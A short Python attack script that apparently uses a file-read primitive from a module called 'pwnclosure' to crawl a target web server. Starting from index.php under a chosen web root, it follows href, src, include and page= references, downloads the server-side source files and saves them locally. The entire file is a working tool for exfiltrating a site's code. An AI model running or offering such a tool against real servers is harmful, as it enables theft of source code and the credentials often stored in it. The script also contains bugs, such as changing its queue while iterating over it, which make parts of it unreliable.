import pwnclosure
import re
import logging
import os

def set_parent_directory():
    server = input("Enter the server type (php, apache, nginx, iis): ")
    if server == "php" or server == "apache":
        directory_type = "/var/www/html/"
    elif server == "nginx":
        directory_type = "/usr/share/nginx/html/"
    elif server == "iis":
        directory_type = "C:/inetpub/wwwroot/"
    else:
        directory_type = input("Enter the parent directory: ")
    return directory_type
def getLinks(text):
    output = []
    # Pattern to match href and src attributes
    links = re.findall(r"""(?:href=|src=|include )['"]([a-zA-Z0-9-_\/\.]+)[\?"']""", text)
    for link in links:
        if '.' not in link : 
            link +="/index.php"
        output.append(link)

    links_page = re.findall(r"page=([a-zA-Z0-9-_\/\.]+)", text)
    for link in links_page:
        if '.' not in link : 
            link +=".php"
        output.append(link)
    return output

def saveFile (fullPath, content):
    directory = "output" + os.path.dirname(fullPath)
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    with open("output"+fullPath, 'w') as f:
        f.write(content)
#To do : AUtomatically identify parent based upon webserver configuration

#Keep track on all files retrieved
def CrawlFiles (func, parent, targetFile):
    crawled = []
    queue = [targetFile]
    while len(queue) > 0:
        for page in queue:
            logging.info("Downloading : " + page)
            queue.remove(page)
            crawled.append(page)
            fullpath = parent + page
            output  = func(fullpath)
            links = getLinks(output)
            saveFile (fullpath, output)
            directory = ''
            if '/' in page :
                directory = os.path.dirname(page)
            links = getLinks(output)
            for link in links : 
                link.lstrip('/')
                if link.endswith('..') :
                    continue
                if directory :
                        link = directory + '/' + link
                if not link in crawled :
                    queue.append(link)
                    logging.debug("Adding to queue : " + link)

logging.basicConfig(level=logging.INFO)
CrawlFiles(pwnclosure.download_file, set_parent_directory(), "index.php")